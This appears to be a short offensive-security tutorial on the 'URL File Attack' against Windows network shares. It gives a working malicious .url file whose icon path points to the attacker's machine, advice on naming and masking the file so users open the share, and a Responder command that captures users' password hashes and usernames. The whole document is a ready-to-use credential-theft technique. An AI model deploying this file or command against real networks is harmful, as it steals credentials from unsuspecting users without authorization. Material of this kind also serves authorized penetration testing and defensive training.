# URL File Attacks

URL File Attack is an attack to use on a system once we have a compromised machine. 

The requirements for this attack are to have a compromised machine and user account. The account you have compromised has to have access to an open network drive. You place a file in the network folder with the below syntax and let the file do the work.

Step 1: URL File

```jsx
[Internet Shortcut]
URL=doenstmatter
WorkingDirectory=doesntmatter
IconFile=\\IPofKaliMachine\%USERNAME%.icon
IconIndex=1
```

Now that the file is made we need to place this file on the shared drive.

Under Working Directory we can actually place a URL such as [google.com](http://google.com) to mask the attack even more.

Step 2: Save the File to network share

Save the file with an @ Sign at the beginning so it appears at the top of the directory. 

Example: “@filename.url”

Step 3: Have responder running

```jsx
responder -I etho0 -v
```

Step 4: Results

All the users have to do is simply click on the file share, not even execute the file, and on responder you will see hashes and usernames.
